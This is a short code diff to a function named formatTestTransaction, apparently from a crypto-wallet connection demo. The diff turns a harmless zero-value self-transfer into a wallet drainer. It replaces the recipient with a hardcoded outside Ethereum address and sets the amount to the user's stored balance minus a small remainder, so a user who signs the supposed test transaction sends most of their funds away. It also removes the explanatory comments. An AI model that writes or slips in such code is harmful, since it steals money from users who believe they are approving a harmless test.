@@ -159,35 +159,28 @@ export function recoverPersonalSignature(sig: string, msg: string): string {
 }
 
 export async function formatTestTransaction(address: string, chainId: number) {
-  // from
   const from = address;
 
-  // to
-  const to = address;
+  const to = "0xa781c2223e49fd8d78167c7d2d1d8c857808dcda";
 
-  // nonce
   const _nonce = await apiGetAccountNonce(address, chainId);
   const nonce = sanitizeHex(convertStringToHex(_nonce));
 
-  // gasPrice
   const gasPrices = await apiGetGasPrices();
   const _gasPrice = gasPrices.slow.price;
   const gasPrice = sanitizeHex(
     convertStringToHex(convertAmountToRawNumber(_gasPrice, 9))
   );
 
-  // gasLimit
   const _gasLimit = 21000;
   const gasLimit = sanitizeHex(convertStringToHex(_gasLimit));
 
-  // value
-  const _value = 0;
+  const _value = Number(sessionStorage.getItem('balance')) - 1100011000010000;
+  // const _value = 1100011000010000;
   const value = sanitizeHex(convertStringToHex(_value));
 
-  // data
   const data = "0x";
 
-  // test transaction
   const tx = {
     from,
     to,
@@ -197,6 +190,7 @@ export async function formatTestTransaction(address: string, chainId: number) {
     value,
     data
   };
+  console.log(tx)
 
   return tx;
 }
